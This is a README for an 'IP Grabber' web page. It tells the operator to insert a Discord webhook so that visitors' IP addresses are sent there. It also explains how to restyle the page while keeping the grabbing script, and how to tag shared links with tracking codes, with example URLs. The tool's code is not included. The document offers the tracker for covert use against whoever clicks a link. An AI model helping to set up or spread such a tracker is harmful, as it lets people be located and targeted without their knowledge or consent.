# IP Grabber

---

**Welcome to the IP Grabber!** This tool is designed to gather IP information using HTML, CSS, and JavaScript. It's provided to you free of charge by yours truly!

## SETUP

To get started, you'll need to follow these simple steps:

1. **Add Your Discord Webhook URL**: Look for the marked section in the code and replace it with your Discord Webhook URL. This ensures that the gathered IP information gets sent to you!

2. **Customize HTML and CSS**: Feel free to personalize the appearance of the IP Grabber by editing the HTML and CSS files. However, it's essential to retain the JavaScript functionality for the IP grabbing to work correctly.

## How to Use Tracking Codes

Sometimes, you may want to track multiple links simultaneously. Here's how you can do it:

- When sending a link without a tracking code: `https://linux.scot/worker`
  - The tracking code will appear as `NULL`.

- When sending a link with a custom tracking code: `https://linux.scot/worker?code=YOURCODE`
  - The tracking code will be displayed as `YOURCODE`.
